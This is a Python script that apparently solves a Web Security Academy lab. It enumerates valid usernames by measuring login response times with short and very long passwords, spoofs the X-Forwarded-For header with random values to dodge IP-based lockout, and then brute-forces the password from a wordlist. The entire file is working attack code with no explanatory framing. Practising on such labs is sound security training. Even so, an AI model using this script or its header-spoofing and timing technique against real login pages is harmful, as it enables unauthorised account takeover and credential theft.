import requests
import uuid

login_url = 'https://0afc003f04fdf966819058a6009a00a9.web-security-academy.net/login'
super_long_password = 'MTIzNGZqYWZhZmthamNhY2Fpcm9laWZpYW9uZmFuZmFvZWlmYW5vZGxjYW5pZmFpZXJpcm9xbmZvd25vZm9pc2ZzbmZpZmlvcXdmbnNhb2Zhb2lu'
short_password = '1234'

def readFile(fileName):
    with open(fileName, "r", encoding="utf-8") as file:
        return file.read().splitlines()
        
def checkUsernameTime(username, password):
    loginData = {"username": username, 
                    "password": password}
    headers = {'X-Forwarded-For': str(uuid.uuid4())}
    response = requests.post(login_url, loginData, headers=headers)
    return response.elapsed.total_seconds()

usernames = readFile("usernames.txt")
passwords = readFile("passwords.txt")

right_username = ""

max_time = 0
print("Finding username - started")
for username in usernames:
    timeWithShortPassword = checkUsernameTime(username=username, password=short_password)
    timeWithLongPassword = checkUsernameTime(username=username, password=super_long_password)
    timeDiff = abs(timeWithLongPassword - timeWithShortPassword)
    if timeDiff > 0.5:
        print(f"User={username} shortPasswordTime={timeWithShortPassword} longPasswordTime={timeWithLongPassword} timeDiff={timeDiff}")
        right_username = username


print("Finding password - started")
for password in passwords:
    loginData = {"username": right_username, 
                "password":  password}
    response = requests.post(login_url, loginData, headers={'X-Forwarded-For': str(uuid.uuid4())})
    if "Invalid username or password." not in response.text:
        print(f"Right combination - Username: {right_username} & password: {password}")
        break
print("Finding password - finished")

print("Finished")



